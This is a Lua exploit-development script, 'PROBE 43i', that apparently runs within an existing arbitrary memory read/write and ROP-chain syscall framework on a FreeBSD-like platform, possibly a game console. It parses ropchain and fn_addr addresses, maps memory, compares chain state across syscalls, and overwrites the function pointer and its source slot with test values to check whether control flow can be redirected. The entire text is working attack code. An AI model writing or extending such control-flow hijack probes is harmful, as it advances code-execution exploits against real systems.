-- CRASH_CLASS: HIGH (ropchain fn_addr modification — WILL CRASH if wrong)
-- PROBE 43i: attempt fn_addr redirect to learn chain rebuild behavior
--
-- From 42i: slot 0 (heap addr) loads the value that becomes fn_addr.
-- Key question: does the Lua layer rebuild the ENTIRE chain per call,
-- or does it only update the syscall number and args?
--
-- Test 1: Write to fn_addr directly, call getpid, check if our write survived
-- Test 2: Write to slot 0 (the source), call getpid, check
-- Test 3: Observe what the chain looks like after DIFFERENT syscalls
--          to understand what's rebuilt vs. constant

print("=== PROBE 43i: FN_ADDR REDIRECT TEST ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function qw_hex(v)
    if type(v) == "table" and v.h then
        return string.format("0x%X%08X", v.h, v.l), v.h, v.l
    end
    local n = to_num(v)
    return string.format("0x%X", n), 0, n
end

local sc_mmap = make_syscall(477)
local sc_getpid = make_syscall(20)
local sc_pipe = make_syscall(42)
local sc_dynlib_get_info = make_syscall(593)

local pid = to_num(pcall(function() return sc_getpid() end) and sc_getpid() or 0)
print("pid: " .. pid)

-- Get ropchain addresses
local pipe_str = tostring(syscall.pipe)
local rop_str = pipe_str:match("ropchain @ (0x[0-9a-fA-F]+)")
local fn_str = pipe_str:match("fcall_stub%.fn_addr: (0x[0-9a-fA-F]+)")

if not rop_str or not fn_str then
    print("cannot parse")
    return
end

local rop_base = uint64(rop_str)
local fn_addr = uint64(fn_str)

print("ropchain: " .. rop_str)
print("fn_addr ptr: " .. fn_str)

-- GPU mmap
local gpu
pcall(function()
    gpu = sc_mmap(uint64(0), uint64(512 * 0x4000), uint64(0x33),
        uint64(0x1002), uint64("0xFFFFFFFF"), uint64(0))
end)
if not gpu then print("GPU FAILED"); return end

-- Verify accessibility
local fn_orig = safe_rq(fn_addr)
if not fn_orig then print("fn_addr not readable"); return end
print("fn_addr original: " .. qw_hex(fn_orig))
print("")

--------------------------------------------------------------------
-- TEST 1: What does the chain look like after getpid vs after pipe?
-- Compare key positions to see what changes between calls.
--------------------------------------------------------------------
print("--- TEST 1: CHAIN AFTER GETPID ---")

pcall(function() sc_getpid() end)

-- Record chain state
local state_getpid = {}
for off = 0, 0x2F8, 8 do
    state_getpid[off] = safe_rq(rop_base + off)
end

-- Record fn_addr
local fn_after_getpid = safe_rq(fn_addr)
print("fn_addr after getpid: " .. qw_hex(fn_after_getpid))

-- Also record what slot 0 points to
-- Slot 0 is at chain+0x010 (from 42i: the first H:near_chain)
local slot0_addr = safe_rq(rop_base + 0x010)
if slot0_addr then
    local slot0_val = safe_rq(slot0_addr)
    print("slot0 addr: " .. qw_hex(slot0_addr))
    print("slot0 val (-> fn_addr): " .. (slot0_val and qw_hex(slot0_val) or "nil"))
end
print("")

print("--- TEST 2: CHAIN AFTER PIPE ---")

local pipe_buf = memory.alloc(16)
safe_wd(pipe_buf, 0)
safe_wd(pipe_buf + 4, 0)
pcall(function() sc_pipe(pipe_buf) end)

-- Record chain state
local state_pipe = {}
for off = 0, 0x2F8, 8 do
    state_pipe[off] = safe_rq(rop_base + off)
end

local fn_after_pipe = safe_rq(fn_addr)
print("fn_addr after pipe: " .. qw_hex(fn_after_pipe))

-- Find differences
local diffs = 0
for off = 0, 0x2F8, 8 do
    local a = state_getpid[off]
    local b = state_pipe[off]
    if a and b then
        local _, ah, al = qw_hex(a)
        local _, bh, bl = qw_hex(b)
        if ah ~= bh or al ~= bl then
            diffs = diffs + 1
            print(string.format("  DIFF +0x%03X: %s -> %s", off, qw_hex(a), qw_hex(b)))
        end
    end
end
print("total diffs: " .. diffs)
print("")

--------------------------------------------------------------------
-- TEST 3: Write test value to fn_addr, then see if getpid rebuilds it
--------------------------------------------------------------------
print("--- TEST 3: FN_ADDR WRITE PERSISTENCE ---")

-- Save original
local fn_saved = safe_rq(fn_addr)
print("original fn_addr: " .. qw_hex(fn_saved))

-- Write test value
safe_wq(fn_addr, uint64("0xDEADBEEFCAFEBABE"))
local fn_test = safe_rq(fn_addr)
print("after test write: " .. qw_hex(fn_test))

-- Now call getpid — this should rebuild the chain
-- The chain will write fn_addr from slot 0
local ok, pid2 = pcall(function() return sc_getpid() end)
print("getpid ok: " .. tostring(ok) .. " pid: " .. (pid2 and to_num(pid2) or -1))

-- Check fn_addr — was it overwritten by the chain rebuild?
local fn_after = safe_rq(fn_addr)
print("fn_addr after getpid: " .. qw_hex(fn_after))

-- Did it get restored to the syscall stub?
if fn_after then
    local _, fah, fal = qw_hex(fn_after)
    local _, fsh, fsl = qw_hex(fn_saved)
    if fah == fsh and fal == fsl then
        print("RESULT: chain REBUILDS fn_addr each call")
    else
        print("RESULT: fn_addr was NOT rebuilt! Our write persists!")
    end
end
print("")

--------------------------------------------------------------------
-- TEST 4: Write to slot 0 (the source that loads into fn_addr)
-- If the chain reads fn_addr from slot 0, and we control slot 0,
-- the chain will load OUR address into fn_addr and call it.
--------------------------------------------------------------------
print("--- TEST 4: SLOT 0 WRITE TEST ---")

if slot0_addr then
    local slot0_saved = safe_rq(slot0_addr)
    print("slot0 original: " .. (slot0_saved and qw_hex(slot0_saved) or "nil"))

    -- Write a harmless test value
    safe_wq(slot0_addr, uint64("0x4141414141414141"))
    local slot0_test = safe_rq(slot0_addr)
    print("slot0 after write: " .. (slot0_test and qw_hex(slot0_test) or "nil"))

    -- Call getpid — if the chain reads from slot 0, fn_addr should
    -- now be 0x4141414141414141 and the call should CRASH
    -- So DON'T actually call! Just check if our write persisted.

    -- Actually, let's see if getpid REBUILDS slot 0
    -- Restore slot 0 first to be safe
    safe_wq(slot0_addr, slot0_saved)
    local slot0_restored = safe_rq(slot0_addr)
    print("slot0 restored: " .. (slot0_restored and qw_hex(slot0_restored) or "nil"))

    -- Now call getpid to prime, then check slot 0 again
    pcall(function() sc_getpid() end)
    local slot0_after = safe_rq(slot0_addr)
    print("slot0 after getpid: " .. (slot0_after and qw_hex(slot0_after) or "nil"))

    -- Check if it changed
    if slot0_saved and slot0_after then
        local _, sh, sl = qw_hex(slot0_saved)
        local _, ah, al = qw_hex(slot0_after)
        if sh == ah and sl == al then
            print("RESULT: slot0 SAME after call — NOT rebuilt by chain")
            print("*** This means we can control fn_addr by writing slot0! ***")
        else
            print("RESULT: slot0 changed — rebuilt by chain")
        end
    end
end

print("")
print("=== PROBE 43i COMPLETE ===")
